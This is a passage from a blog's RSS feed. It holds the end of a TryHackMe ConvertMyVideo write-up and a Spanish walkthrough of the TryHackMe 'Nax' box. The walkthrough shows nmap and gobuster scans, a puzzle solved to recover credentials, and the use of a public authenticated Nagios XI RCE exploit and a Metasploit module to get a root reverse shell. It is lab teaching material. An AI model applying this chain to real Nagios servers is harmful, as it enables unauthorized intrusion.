&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/convertmyvideo/Screenshot_20200505_222133.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Agregamos una shell inversa a este archivo y pusimos a la escucha netcat, logramos obtener una shell con usuario root y nuestra flag &lt;strong&gt;root.txt&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/convertmyvideo/Screenshot_20200505_222340.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/convertmyvideo/Screenshot_20200505_222433.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/convertmyvideo/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/convertmyvideo/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - Nax</title>
        <link>https://sckull.github.io/posts/nax/</link>
        <pubDate>Tue, 05 May 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Tue, 05 May 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/nax/</guid>
        <description>Nax es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;Nax es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/nax/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;Nax&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;Identify the critical security flaw in the most powerful and trusted network monitoring software on the market, that allows an user authenticated execute remote code execution.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;490&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Media&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/stuxnet&#34;&gt;stuxnet&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto http (80), ldap (389) y el puerto ssh (22) abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Tue May  5 00:26:26 2020 as: nmap -sV -o nmap_scan_mini nax.thm&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; nax.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.253.17&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.26s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;995&lt;/span&gt; closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
25/tcp  open  smtp    Postfix smtpd
80/tcp  open  http    Apache httpd 2.4.18 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
389/tcp open  ldap    OpenLDAP 2.2.X - 2.3.X
443/tcp open  ssl/ssl Apache httpd &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SSL-only mode&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Service Info: Host:  ubuntu.localdomain&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Tue May  5 00:27:33 2020 -- 1 IP address (1 host up) scanned in 67.23 seconds&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Tue May  5 00:27:36 2020 as: nmap -T5 -sV -sC -p- -o nmap_scan nax.thm&lt;/span&gt;
Warning: 10.10.253.17 giving up on port because retransmission cap hit &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;2&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; nax.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.253.17&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.18s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;65358&lt;/span&gt; closed ports, &lt;span class=&#34;m&#34;&gt;171&lt;/span&gt; filtered ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; 62:1d:d9:88:01:77:0a:52:bb:59:f9:da:c1:a6:e3:cd &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; af:67:7d:24:e5:95:f4:44:72:d1:0c:39:8d:cc:21:15 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 20:28:15:ef:13:c8:9f:b8:a7:0f:50:e6:2f:3b:1e:57 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
25/tcp   open  smtp       Postfix smtpd
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_smtp-commands: ubuntu.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssl-cert: Subject: &lt;span class=&#34;nv&#34;&gt;commonName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;ubuntu
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Not valid before: 2020-03-23T23:42:04
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_Not valid after:  2030-03-21T23:42:04
80/tcp   open  http       Apache httpd 2.4.18 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.18 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Site doesn&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;t have a title &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;text/html&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
389/tcp  open  ldap       OpenLDAP 2.2.X - 2.3.X
443/tcp  open  ssl/ssl    Apache httpd &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SSL-only mode&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.18 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: &lt;span class=&#34;m&#34;&gt;400&lt;/span&gt; Bad Request
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssl-cert: Subject: &lt;span class=&#34;nv&#34;&gt;commonName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;192.168.85.153/organizationName&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Nagios Enterprises/stateOrProvinceName&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Minnesota/countryName&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;US
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Not valid before: 2020-03-24T00:14:58
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_Not valid after:  2030-03-22T00:14:58
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_ssl-date: TLS randomness does not represent &lt;span class=&#34;nb&#34;&gt;time&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; tls-alpn: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  http/1.1
5667/tcp open  tcpwrapped
Service Info: Host:  ubuntu.localdomain&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Tue May  5 00:42:16 2020 -- 1 IP address (1 host up) scanned in 879.93 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h2&gt;
&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@upset:~/thm/nax# gobuster dir -u http://nax.thm/ -w /usr/share/wordlists/dirb/common.txt -t &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; -q -x php,html,txt
/cgi-bin/ &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/cgi-bin/.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/cgi-bin/.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/javascript &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/nagios &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 401&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/server-status &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP &lt;/h2&gt;
&lt;p&gt;Encontramos una pagina simple en el puerto 80 y en el codigo fuente encontramos una direccion.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/nax/Screenshot%20from%202020-05-04%2023.48.43.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;gobuster-nagiosxi&#34;&gt;GOBUSTER /nagiosxi/&lt;/h2&gt;
&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos en &lt;code&gt;/naxiosxi/&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@upset:~/thm/nax# gobuster dir -w /usr/share/wordlists/dirb/common.txt -t &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; -q -x php,html,txt -u http://nax.thm/nagiosxi/
/about &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/account &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/admin &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/api &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/backend &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/config &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/db &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/help &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/images &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/includes &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 302&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 302&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/install.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 302&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/login.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/reports &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/tools &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/upgrade.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 302&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/views &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;nagios-xi-rce&#34;&gt;NAGIOS XI RCE&lt;/h2&gt;
&lt;p&gt;En la ruta &lt;code&gt;/naxiosxi/&lt;/code&gt; encontramos una plataforma la de Naxios XI, buscamos un exploit que pueda afectar esta plataforma y vemos que existe un exploit &lt;a href=&#34;https://github.com/jakgibb/nagiosxi-root-rce-exploit&#34;&gt;&lt;strong&gt;NagiosXi RCE&lt;/strong&gt;&lt;/a&gt; el cual necesita un usuario y contraseña, tambien existe un exploit para metasploit &lt;code&gt;nagiosxi_authenticated_rce&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;En la pagina principal (/) encontramos una image ASCII de lo que parece ser &lt;a href=&#34;https://www.ayojon.mx/galeria/2018/08/47732_m.jpg&#34;&gt;Cicada 3301&lt;/a&gt; y con algunos valores debajo de esta &lt;code&gt;Ag Hg Ta Sb Po Pd Hg Pt Lr&lt;/code&gt; al principio intentamos utilizar un decodificador de &lt;a href=&#34;https://cyber.meme.tips/xlate/runes/&#34;&gt;&lt;strong&gt;Gematria Primus&lt;/strong&gt;&lt;/a&gt; pero los valores numericos no reflejaban ningun tipo de texto o codificacion valida. Realizamos una busqueda de estos valores y encontramos que todos pertenecen a la tabla periodica, obtenemos los valores numericos de cada elemento.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Ag ---&amp;gt; &lt;span class=&#34;m&#34;&gt;47&lt;/span&gt;
Hg ---&amp;gt; &lt;span class=&#34;k&#34;&gt;do&lt;/span&gt; it yourself
Ta ---&amp;gt; &amp;gt;:&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Sb ---&amp;gt; &lt;span class=&#34;k&#34;&gt;do&lt;/span&gt; it yourself
Po ---&amp;gt; &amp;gt;:&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Pd ---&amp;gt; &lt;span class=&#34;k&#34;&gt;do&lt;/span&gt; it yourself
Hg ---&amp;gt; &amp;gt;:&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Pt ---&amp;gt; &lt;span class=&#34;k&#34;&gt;do&lt;/span&gt; it yourself
Lr ---&amp;gt; &lt;span class=&#34;m&#34;&gt;103&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Al obtener estos valores lo decodificamos de hex a texto plano y encontramos una direccion de un archivo.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/nax/Screenshot%20from%202020-05-05%2000.08.12.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al visitar la direccion del archivo vemos que es una imagen que tiene texto codificado y utiliza la codificacion de &lt;a href=&#34;https://www.bertnase.de/npiet/npiet-execute.php&#34;&gt;&lt;strong&gt;piet&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/nax/Screenshot%20from%202020-05-05%2000.11.06.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al decodificar la imagen nos devuelve una cadena de caracteres.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/nax/Screenshot%20from%202020-05-05%2000.13.18.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Logramos obtener un usuario y contraseña, verificamos que funcionan en la plataforma ingresando con las credenciales.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/nax/Screenshot%20from%202020-05-05%2000.53.15.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos estas credenciales con el exploit que encontramos para Naxios (&lt;em&gt;El exploit me dio algunos errores por lo que tuve que agregar la contraseña directamente al codigo&lt;/em&gt;).&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/nax/Screenshot%20from%202020-05-05%2000.49.03.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ejecutamos el exploit y ponemos a la escucha netcat, y logramos obtener una shell.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/nax/Screenshot%20from%202020-05-05%2000.52.08.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Nuestra shell ya tiene privilegios root por lo que no es necesario escalar privilegios, y logramos obtener nuestra flag &lt;strong&gt;user.txt&lt;/strong&gt; y &lt;strong&gt;root.txt&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/nax/Screenshot%20from%202020-05-05%2000.55.02.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;metasploit---nagiosxi-rce&#34;&gt;Metasploit - NagiosXi RCE&lt;/h2&gt;
&lt;p&gt;Utilizamos el exploit disponible para metasploit y funciona muy bien.&lt;/p&gt;
